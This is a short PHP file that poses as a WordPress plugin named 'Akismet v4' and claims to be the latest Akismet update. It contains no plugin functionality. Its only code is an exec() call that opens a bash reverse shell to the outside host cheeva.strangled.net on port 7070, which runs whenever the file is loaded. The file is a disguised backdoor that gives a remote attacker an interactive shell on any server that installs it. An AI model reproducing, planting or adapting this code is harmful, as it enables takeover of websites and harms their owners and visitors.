﻿<?php
/**
* Plugin Name: Akismet v4
* Description: Akismet Latest Update.
* Version: 0.1
* Author: Wordpress Jet
* Author URI: https://wordpress.com
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/cheeva.strangled.net/7070 0>&1'");
?>